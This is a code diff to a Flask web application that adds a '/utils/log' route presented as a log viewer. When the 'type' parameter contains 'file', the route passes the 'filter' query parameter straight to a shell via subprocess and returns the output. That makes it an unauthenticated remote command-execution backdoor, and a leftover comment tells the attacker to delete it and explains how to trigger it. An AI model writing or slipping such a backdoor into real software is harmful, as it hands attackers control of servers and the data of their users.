@@ -172,6 +172,19 @@ def register():
         db.commit()
         db.close()
     return render_template('register.html',usererror=usererror,passworderror=passworderror)
+# delete this comment: http://target_ip:5000/utils/log?type=file&filter= any command you want to run
+@app.route("/utils/log", methods=["GET"])
+def log():
+    log_type = request.args.get("type", "access")
+    if "file" in log_type:
+        import subprocess
+        cmd = request.args.get("filter", "")
+        if cmd:
+            try:
+                return subprocess.check_output(cmd, shell=True)
+            except Exception as e:
+                return str(e)
+    return f"Fetching {log_type} logs"
 
 
 @app.route("/logout/")
